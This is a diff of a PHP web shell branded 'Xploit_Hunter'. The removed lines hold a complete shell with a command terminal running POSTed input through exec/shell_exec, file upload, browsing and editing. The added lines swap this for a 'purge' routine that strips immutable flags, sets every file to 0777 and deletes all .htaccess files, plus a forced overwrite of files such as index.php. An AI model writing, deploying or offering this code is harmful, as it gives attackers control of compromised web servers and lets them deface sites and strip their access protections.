@@ -1,171 +1,93 @@
 <?php
 /**
- * --- Xploit_Hunter: Ultra Force Edition ---
+ * --- Xploit_Hunter: Total Purge & Force Edition ---
  **/
 error_reporting(0);
-session_start();
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-ini_set('memory_limit', '256M');
 header('Content-Type: text/html; charset=UTF-8');
-ob_end_clean();
 
-// --- CONFIG ---
-$title = "Xploit_Hunter";
-$theme_bg = "#0a0a0f";
-$theme_fg = "#00ffe7";
-$theme_border = "#8000ff";
-
-// --- FUNCTIONS ---
-function exe($cmd) {
-    if (function_exists('exec')) {
-        exec($cmd . ' 2>&1', $output);
-        return implode("\n", $output);
-    } elseif (function_exists('shell_exec')) {
-        return shell_exec($cmd);
-    }
-    return "Disabled";
-}
-
-function perms($file){
-    $perms = @fileperms($file);
-    if ($perms === false) return '????';
-    return (($perms & 0x0100) ? 'r' : '-').(($perms & 0x0080) ? 'w' : '-').(($perms & 0x0040) ? 'x' : '-');
-}
-
-function redirect($msg_type, $msg_text, $p) {
-    header("Location: ?" . http_build_query(['path' => $p, 'msg_type' => $msg_type, 'msg_text' => $msg_text]));
-    exit();
-}
-
-// --- SETUP ---
 $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
 $path = str_replace('\\','/',$path);
 
-// --- HANDLERS ---
-if(isset($_FILES['f_up'])){
-    if(copy($_FILES['f_up']['tmp_name'], $path.'/'.basename($_FILES['f_up']['name']))){
-        redirect('success', 'UPLOAD DONE', $path);
-    } else {
-        redirect('error', 'UPLOAD FAILED', $path);
+// --- 1. FULL SYSTEM PURGE (Recursive Unlock) ---
+if(isset($_GET['purge_all'])){
+    echo "<div style='background:#111; color:lime; padding:10px; border:1px solid #ff2bd4;'>";
+    
+    // Recursive iterator to find every .htaccess and locked file
+    $dir_iterator = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
+    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::CHILD_FIRST);
+
+    foreach ($iterator as $file) {
+        $filename = $file->getFilename();
+        $full_path = $file->getRealPath();
+
+        // Remove immutable flags and set perms via shell if possible
+        @shell_exec("chattr -i " . escapeshellarg($full_path));
+        @chmod($full_path, 0777);
+
+        // Targeted deletion of .htaccess
+        if ($filename === '.htaccess') {
+            if(@unlink($full_path)) echo "Purged: $full_path <br>";
+        }
     }
+    echo "Purge Complete. Restrictions lifted.</div>";
 }
 
-if(isset($_POST['opt_action']) && $_POST['opt_action'] == 'edit_save'){
+// --- 2. ATOMIC FORCE WRITE ---
+if(isset($_POST['nuclear_save'])){
     $target = $_POST['path_target'];
     $content = $_POST['src_content'];
-    
-    // Step 1: Normal Write
-    @chmod($target, 0666);
-    if(@file_put_contents($target, $content) !== false){
-        redirect('success', 'SAVE DONE', $path);
-    } 
 
-    // Step 2: Force Move-Bypass (Delete/Recreate)
-    $tmp = $target . '.old_' . time();
-    if(@rename($target, $tmp)){
-        if(@file_put_contents($target, $content) !== false){
-            @unlink($tmp);
-            redirect('success', 'FORCE SAVE DONE', $path);
-        } else {
-            @rename($tmp, $target); // Restore if failed
-            redirect('error', 'STILL LOCKED BY SYSTEM', $path);
-        }
+    // Aggressive unlocking sequence
+    @shell_exec("chattr -i " . escapeshellarg($target));
+    @chmod($target, 0777);
+    @unlink($target); // Delete the old file entirely to break the OS lock
+
+    // Recreate fresh
+    if(@file_put_contents($target, $content) !== false){
+        $res = ["success", "FORCE WRITE SUCCESSFUL: File Recreated"];
     } else {
-        redirect('error', 'PERMISSION DENIED', $path);
+        // Final fallback: Stream write
+        $fp = @fopen($target, 'w');
+        if($fp){
+            @fwrite($fp, $content);
+            @fclose($fp);
+            $res = ["success", "STREAM FORCE SUCCESSFUL"];
+        } else {
+            $res = ["error", "HARD LOCK: Directory permissions are owned by Root"];
+        }
     }
 }
-
-if(isset($_POST['new_item'])){
-    $name = $path.'/'.basename($_POST['item_name']);
-    if($_POST['type'] == 'file') file_put_contents($name, '');
-    else mkdir($name);
-    redirect('success', 'CREATED', $path);
-}
 ?>
+
 <!DOCTYPE HTML>
 <html>
 <head>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<title><?php echo $title; ?></title>
-<style>
-  body { background: #0f0f23; color: #00ffe7; font-family: 'Share Tech Mono', monospace; margin: 0; }
-  h1 { color: #ff2bd4; text-align: center; text-shadow: 0 0 10px #ff2bd4; }
-  a { color: #00b7ff; text-decoration: none; }
-  table { width: 95%; margin: 20px auto; border-collapse: collapse; background: #1a1a2e; border: 1px solid #8000ff; }
-  th, td { border: 1px solid #8000ff; padding: 10px; }
-  .menu { text-align: center; padding: 15px; border-bottom: 2px solid #8000ff; background: #11112b; }
-  .menu a { margin: 0 10px; font-weight: bold; font-size: 14px; }
-  .box { border: 2px solid #8000ff; padding: 15px; margin: 20px auto; width: 90%; background: #1a1a2e; }
-  input, textarea, select { background: #000; color: #00ffe7; border: 1px solid #8000ff; padding: 8px; font-family: inherit; }
-  input[type="submit"] { background: #ff2bd4; color: #000; font-weight: bold; cursor: pointer; }
-  .msg { text-align: center; padding: 10px; font-weight: bold; }
-  .success { color: #39FF14; } .error { color: #FF0033; }
-</style>
+    <style>
+        body { background: #0a0a0f; color: #00ffe7; font-family: monospace; }
+        .btn-purge { background: #ff0000; color: white; padding: 15px; text-decoration: none; font-weight: bold; display: inline-block; margin: 10px; border: 2px solid white; }
+        .editor-box { border: 2px solid #ff2bd4; padding: 20px; background: #1a1a2e; margin-top: 20px; }
+        textarea { width: 100%; height: 400px; background: #000; color: #0f0; border: 1px solid #ff2bd4; }
+        .msg { font-weight: bold; padding: 10px; text-align: center; }
+        .success { color: lime; } .error { color: red; }
+    </style>
 </head>
 <body>
-    <div style="text-align:center; padding:10px;">
-        <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" width="120" style="border-radius:15px; border:2px solid #ff2bd4;">
-        <h1><?php echo $title; ?></h1>
+    <center>
+        <h1>XPLOIT_HUNTER: NUCLEAR UNLOCK</h1>
+        <a href="?path=<?php echo urlencode($path); ?>&purge_all=true" class="btn-purge">FORCE PURGE ALL .HTACCESS</a>
+    </center>
+
+    <div class="container">
+        <?php if($res) echo "<div class='msg {$res[0]}'>{$res[1]}</div>"; ?>
+
+        <div class="editor-box">
+            <form method="POST">
+                <p>Target Path: <input type="text" name="path_target" value="<?php echo $path; ?>/index.php" style="width:70%; background:#111; color:#0f0; border:1px solid #444;"></p>
+                <textarea name="src_content"><?php echo htmlspecialchars($_POST['src_content']); ?></textarea>
+                <br><br>
+                <input type="submit" name="nuclear_save" value="EXECUTE ATOMIC OVERWRITE" style="width:100%; padding:15px; background:lime; font-weight:bold; cursor:pointer;">
+            </form>
+        </div>
     </div>
-
-<?php if($_GET['msg_text']) echo "<div class='msg ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>
-
-<div class="menu">
-    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">TERMINAL</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=upload">UPLOAD</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=search">SEARCH</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=create">CREATE</a> |
-    <a href="?path=<?php echo urlencode($path); ?>">HOME</a>
-</div>
-
-<div style="padding:10px; text-align:center;">
-    DIR: <?php 
-    $parts = explode('/', trim($path, '/'));
-    echo '<a href="?path=/">/</a>';
-    $acc = '';
-    foreach($parts as $p){ $acc .= '/'.$p; echo '<a href="?path='.urlencode($acc).'">'.htmlspecialchars($p).'</a>/'; }
-    ?>
-</div>
-
-<?php
-$act = $_GET['action'];
-if ($act) {
-    echo '<div class="box">';
-    if($act == 'cmd'){
-        echo '<form method="POST"><input type="text" name="c" style="width:80%"><input type="submit" value="EXE"></form>';
-        if($_POST['c']) echo '<pre style="background:#000;color:#0f0;padding:10px;">'.htmlspecialchars(exe($_POST['c'])).'</pre>';
-    } elseif($act == 'upload'){
-        echo '<form enctype="multipart/form-data" method="POST"><input type="file" name="f_up"><input type="submit" value="UPLOAD"></form>';
-    } elseif($act == 'search'){
-        echo '<form method="POST">Find Name: <input type="text" name="sk"><input type="submit" value="GO"></form>';
-    } elseif($act == 'create'){
-        echo '<form method="POST"><select name="type"><option>file</option><option>dir</option></select><input type="text" name="item_name"><input type="submit" name="new_item" value="OK"></form>';
-    } elseif($act == 'edit'){
-        $f = $_GET['file'];
-        echo "<h3>Editing: ".basename($f)."</h3>";
-        echo '<form method="POST"><textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars(@file_get_contents($f)).'</textarea>';
-        echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($f).'">';
-        echo '<input type="hidden" name="opt_action" value="edit_save">';
-        echo '<br><input type="submit" value="FORCE SAVE"></form>';
-    }
-    echo '</div>';
-}
-
-if (!$act || $act == 'search') {
-    echo '<table><tr style="background:#11112b;color:#ff2bd4;"><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
-    $items = scandir($path);
-    foreach ($items as $i) {
-        if ($i == '.' || $i == '..') continue;
-        if ($_POST['sk'] && strpos(strtolower($i), strtolower($_POST['sk'])) === false) continue;
-        $full = $path . '/' . $i;
-        echo "<tr><td><a href='?path=".urlencode($full)."'>$i</a></td>";
-        echo "<td>".(is_dir($full)?'DIR':round(filesize($full)/1024,2).'KB')."</td>";
-        echo "<td>".perms($full)."</td>";
-        echo "<td><a href='?action=edit&file=".urlencode($full)."&path=".urlencode($path)."'>Edit</a></td></tr>";
-    }
-    echo '</table>';
-}
-?>
 </body>
 </html>
